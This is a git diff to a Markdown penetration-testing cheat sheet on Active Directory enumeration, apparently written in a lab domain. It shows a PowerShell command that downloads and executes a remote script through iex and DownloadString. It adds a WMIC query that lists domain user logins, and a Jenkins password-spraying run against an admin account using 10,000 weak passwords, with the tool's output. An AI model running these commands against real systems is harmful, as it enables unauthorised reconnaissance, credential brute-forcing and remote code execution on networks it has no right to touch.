@@ -358,13 +358,12 @@ References:
 https://docs.microsoft.com/pl-pl/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
 ```
 
-# Information Gathering with AD Module
-
+# Information Gathering
 Import AD module
 ```
 PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
-Get Domain info
+Get Domain info with AD Module
 
 ```
 PS C:\Users\pparker> Get-ADDomain                                                                                       
@@ -408,7 +407,7 @@ PropertyCount                      : 30
 
 ```
 
-Get Domain users 
+Get Domain users with AD Module
 
 ```
 PS C:\Users\pparker> Get-ADUser -Filter * -Properties *                                                                 
@@ -527,9 +526,13 @@ PropertyCount      : 107
 
 
 ```
+Get Domain Users logins with WMIC
 
+```
+ wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
+```
 
-Get Domain user info 
+Get Domain user info with AD module
 ```
 
 PS C:\Users\pparker> Get-ADUser -Identity spn1                                                                          
@@ -570,7 +573,7 @@ DnsAdmins
 
 ```
 
-Get users of Group Domain Admins
+Get users of Group Domain Admins with AD module
 ```
 PS C:\Users\pparker> Get-ADGroupMember -Identity "Domain Admins" -Recursive                                             
 
@@ -600,7 +603,7 @@ PropertyCount      : 6
 
 ```
 
-Get User Groups 
+Get User Groups with AD module
 
 ```
 PS C:\Users\pparker> Get-ADPrincipalGroupMembership -Identity spn1                                                      
@@ -634,7 +637,7 @@ ModifiedProperties : {}
 PropertyCount      : 8
 ```
 
-Get all computers in the domain
+Get all computers in the domain with AD module
 ```
 PS C:\Users\pparker> Get-ADComputer -Filter * -Properties * | select name                                               
 Name
@@ -738,4 +741,21 @@ Source   : Spiderman\pparker
 Hostname : 192.168.22.211
 Username : MARVEL\Administrator
 
+```
+
+Bruteforce password on Jenkins instance
+
+```
+PS C:\Users\punishell\Desktop\> Invoke-JenkinsPasswordSpray -URL http://192.168.22.55:8080 -Username 'admin' -PasswordFile .\10k-worst-passwords.txt
+[+] Will use this URL: http://192.168.22.55:8080
+[+] Testing if URL is valid
+[+] Provided URL: http://192.168.22.55:8080 returns 200 OK.
+
+Confirm Password Spray
+Are you sure you want to password spray the URL http://192.168.22.55:8080 with 1 accounts and 10000 passwords?
+[Y] Yes  [N] No  [?] Help (default is "Y"): y
+
+[+] Start password spraying the URL http://192.168.22.55:8080 with 1 user(s) and 10000 password(s). Total request count is 10000. Current time is 12:30 PM. Successful logins will be written to
+[Attempt 1 / 10000] - Spraying username:projectadmin with password:password
+The ContinueOnSuccess parameter is set to False or not set. Spraying will now stop
 ```
